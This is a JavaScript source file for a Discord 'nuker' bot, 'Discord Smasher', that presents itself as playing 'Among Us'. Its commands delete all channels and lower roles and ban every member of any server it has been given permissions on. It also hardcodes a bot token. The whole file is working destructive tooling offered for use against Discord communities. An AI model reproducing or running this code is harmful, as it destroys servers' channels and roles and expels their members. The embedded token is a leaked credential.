const discord = require("discord.js");
const minox = new discord.Client();


minox.on("ready", () =>{
console.log(" Discord Smasher , All Systems Operational.  ")
console.log(`${minox.user.tag} is online , all commands working .`);
minox.user.setPresence({ game: { name: `Among Us` }, type: 0 });
});

minox.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("I dont know lol "));
}
if(msg.content.toLowerCase().startsWith("!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("!" + "ban")){
    msg.guild.members.tap(member => member.ban("i dont know lol "));
}
if(msg.content.toLowerCase().startsWith("!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: " Discord Smasher By MinoX -  v.1.0" },
            description: "!smash - Ban & delete all members and all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord"
        }
    })
}
});

minox.login("NzI5ODM1NjE1NjkxOTk3MjA0.XwOuYg.USov48qJkVr0bOt3pgUzfn_BZec"); // HERE YOUR BOT TOKEN